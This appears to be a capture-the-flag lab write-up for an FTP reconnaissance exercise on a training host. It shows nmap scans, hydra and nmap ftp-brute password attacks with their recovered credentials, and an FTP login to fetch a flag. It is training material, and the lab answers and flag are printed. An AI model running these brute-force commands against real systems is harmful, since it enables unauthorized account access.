# ProFTP Recon: Basics

### Target:
`demo.ine.local`

### Tools:
* `nmap`
* `hydra`

---

### Objectives: Answer the following questions:

#### What is the version of FTP server?
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-23 09:19 IST
Nmap scan report for demo.ine.local (192.126.246.3)
Host is up (0.000025s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:7E:F6:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```
Ans: **ProFTPD 1.3.5a**

---

#### Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
```bash
┌──(root㉿INE)-[~]
└─# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://demo.ine.local
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-23 09:21:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://demo.ine.local:21/
[21][ftp] host: demo.ine.local   login: sysadmin   password: 654321
[21][ftp] host: demo.ine.local   login: rooty   password: qwerty
[21][ftp] host: demo.ine.local   login: demo   password: butterfly
[21][ftp] host: demo.ine.local   login: auditor   password: chocolate
[21][ftp] host: demo.ine.local   login: anon   password: purple
[21][ftp] host: demo.ine.local   login: administrator   password: tweety
[21][ftp] host: demo.ine.local   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-23 09:21:48
```
---
#### Find the password of user “sysadmin” using nmap script.
```bash
┌──(root㉿INE)-[~]
└─# echo "sysadmin" > users                                                                                                                                                                

┌──(root㉿INE)-[~]
└─# nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-23 09:23 IST
Nmap scan report for demo.ine.local (192.126.246.3)
Host is up (0.000041s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     sysadmin:654321 - Valid credentials
|_  Statistics: Performed 22 guesses in 5 seconds, average tps: 4.4
MAC Address: 02:42:C0:7E:F6:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.11 seconds
```
Ans: **654321**

---

#### Flag kept in user `auditor`s files :

```bash
┌──(root㉿INE)-[~]
└─# ftp demo.ine.local                                                                                                                                                                     
Connected to demo.ine.local.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.126.246.3]
Name (demo.ine.local:root): auditor
331 Password required for auditor
Password: 
230 User auditor logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||22337|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||23708|)
150 Opening BINARY mode data connection for secret.txt (33 bytes)
100% |**********************************************************************************************************************************************|    33      805.66 KiB/s    00:00 ETA
226 Transfer complete
33 bytes received in 00:00 (117.61 KiB/s)
ftp> exit
221 Goodbye.

┌──(root㉿INE)-[~]
└─# cat secret.txt                                                                                                                                                                         
098f6bcd4621d373cade4e832627b4f6
```
Ans: **098f6bcd4621d373cade4e832627b4f6**